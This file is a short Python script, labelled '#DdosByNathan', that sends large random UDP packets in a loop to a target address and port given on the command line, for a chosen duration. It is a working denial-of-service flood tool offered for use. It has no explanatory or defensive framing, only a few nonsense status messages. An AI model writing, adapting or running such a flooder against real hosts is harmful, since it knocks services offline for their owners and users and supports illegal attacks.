#DdosByNathan
import os
import sys
import time
import socket
import random
import string
import optparse
#-------------------------------------------------------------#
def usage():
    print ("")
#-------------------------------------------------------------#
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print ("ENTODDDDDDDD !!!")
#-------------------------------------------------------------#
def main():
    try:
          print (len(sys.argv))
          if len(sys.argv) != 4:
             usage()
          else:
             flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
    except IndexError:
          sys.exit("CRROOTTTTTTT !!!")
if __name__ == '__main__':
    main()
